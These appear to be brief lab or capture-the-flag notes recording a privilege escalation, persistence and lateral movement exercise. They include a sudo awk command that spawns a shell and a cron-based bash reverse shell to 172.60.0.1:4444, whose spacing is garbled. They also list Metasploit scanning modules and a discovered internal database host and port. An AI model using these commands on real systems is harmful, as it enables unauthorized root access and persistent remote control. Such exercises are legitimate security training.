*** PHASE 1: PRIVLEGE ESCALATION
*** Initial Access User: mercenary
*** Vulnerable sudo Binary /usr/bin/awk
*** GTFOBins Exploit COmmand Used: sudo awk 'BEGIN {system("/bin/sh")}'

*** PHASE 2: Persistence
* ** Cron Syntax used:   * * * * */bin/bash-c'bash-i>&/dev/tcp/172.60.0.1/4444 0>&1'
** Persistence Confirmed: Yes

*** PHASE 3: Lateral Movement 
* ** Metasploit modules used: auxiliary/scanner/ssh/ssh_login,auxiliary/scanner/portscan/tcp (and internal nmap)
* ** Hidden Database IP Discovered: 10.0.10.50
* ** Open Port on Hidden Database: 6379 
